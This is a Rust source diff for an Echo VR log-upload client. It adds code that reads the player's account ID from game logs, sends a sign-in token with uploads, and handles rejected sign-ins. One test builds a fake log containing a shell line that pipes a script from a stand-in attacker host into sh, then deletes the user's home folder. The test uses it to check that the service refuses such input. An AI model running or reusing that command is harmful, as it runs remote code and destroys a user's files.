@@ -454,15 +454,53 @@ fn upload_url() -> String {
     UPLOAD_URL.into()
 }
 
+/// Pure: the last Echo VR account ("OVR-ORG-" and its number, the XPID) in a game log.
+pub fn last_oid(text: &str) -> Option<String> {
+    let mut found = None;
+    let mut rest = text;
+    while let Some(at) = rest.find("OVR-ORG-") {
+        let digits: String = rest[at + 8..]
+            .chars()
+            .take_while(char::is_ascii_digit)
+            .take(24)
+            .collect();
+        if digits.len() >= 3 {
+            found = Some(format!("OVR-ORG-{digits}"));
+        }
+        rest = &rest[at + 8..];
+    }
+    found
+}
+
+/// The Echo VR account this PC played with last: the newest game log that names one.
+pub fn find_oid(versions: &[InstalledVersion]) -> Option<String> {
+    collect(versions)
+        .iter()
+        .filter(|s| s.kind == Kind::Echo)
+        .find_map(|s| last_oid(&String::from_utf8_lossy(&std::fs::read(&s.path).ok()?)))
+}
+
+/// Who uploads: the EchoVRCE session (the service reads the account's IDs with it, and
+/// takes uploads only from signed-in players), and the Echo VR account of this PC.
+pub struct Uploader {
+    pub token: String,
+    pub oid: Option<String>,
+}
+
 /// Sends `bundle`; the reference the service gives it, or what went wrong in plain words.
-pub fn upload(bundle: Vec<u8>) -> Result<String> {
+pub fn upload(bundle: Vec<u8>, who: &Uploader) -> Result<String> {
     let url = upload_url();
     let (status, body) = super::http::block_on(async {
-        let resp = super::http::client()
+        let mut req = super::http::client()
             .post(&url)
             // Sending, then the service's checks (its file type check takes a while).
             .timeout(Duration::from_secs(600))
             .header("Content-Type", "text/plain; charset=utf-8")
+            .header("Authorization", format!("Bearer {}", who.token));
+        if let Some(oid) = &who.oid {
+            req = req.header("X-Echo-OID", oid);
+        }
+        let resp = req
             .body(bundle)
             .send()
             .await
@@ -476,6 +514,9 @@ pub fn upload(bundle: Vec<u8>) -> Result<String> {
         200 | 201 => field("code")
             .filter(|c| c.len() <= 32 && c.chars().all(|ch| ch.is_ascii_alphanumeric()))
             .ok_or_else(|| anyhow!("The log upload service answered without a reference.")),
+        401 => Err(anyhow!(
+            "EchoVRCE didn't accept your sign-in: sign in again on the EchoVRCE page, then upload again."
+        )),
         429 => Err(anyhow!(
             "Too many uploads from your network: try again in an hour."
         )),
@@ -496,6 +537,16 @@ pub fn upload(bundle: Vec<u8>) -> Result<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    #[test]
+    fn finds_the_last_echo_account() {
+        let log = "[10-05-2026] [14:58:11]: [NSUSER] saved C:\\users\\steamuser\\AppData\\Local\\RAD\\EchoVR\\users\\OVR-ORG\\1\\clientprofile.json\n\
+                   [10-05-2026] [15:00:22]: [NSUSER] Destroying user OVR-ORG-3963667097037078\n\
+                   [10-05-2026] [15:00:22]: [LOGIN] Logging OVR-ORG-3963667097037079 out\n";
+        assert_eq!(last_oid(log).as_deref(), Some("OVR-ORG-3963667097037079"));
+        assert_eq!(last_oid("OVR-ORG\\1\\x OVR-ORG-12"), None);
+        assert_eq!(last_oid(""), None);
+    }
 
     #[test]
     fn names_files_safely() {
@@ -652,7 +703,11 @@ mod tests {
     fn uploads_to_the_service() {
         let sources = collect(&[]);
         assert!(!sources.is_empty(), "no launcher logs here");
-        let code = upload(bundle(&sources).unwrap()).unwrap();
+        let who = Uploader {
+            token: "dev".into(),
+            oid: Some("OVR-ORG-123".into()),
+        };
+        let code = upload(bundle(&sources).unwrap(), &who).unwrap();
         assert_eq!(code.len(), 8, "{code}");
         // Not a log: refused, with the service's own words.
         let script = "#!/bin/sh\nset -e\ncurl -s http://evil.example/x | sh\nrm -rf \"$HOME\"\n";
@@ -660,7 +715,7 @@ mod tests {
             "ECHOVR-LOGS 1\nFILE launcher/a.log {}\n{script}END\n",
             script.len()
         );
-        let err = upload(body.into_bytes()).unwrap_err().to_string();
+        let err = upload(body.into_bytes(), &who).unwrap_err().to_string();
         assert!(err.contains("doesn't look like a log"), "{err}");
     }
 
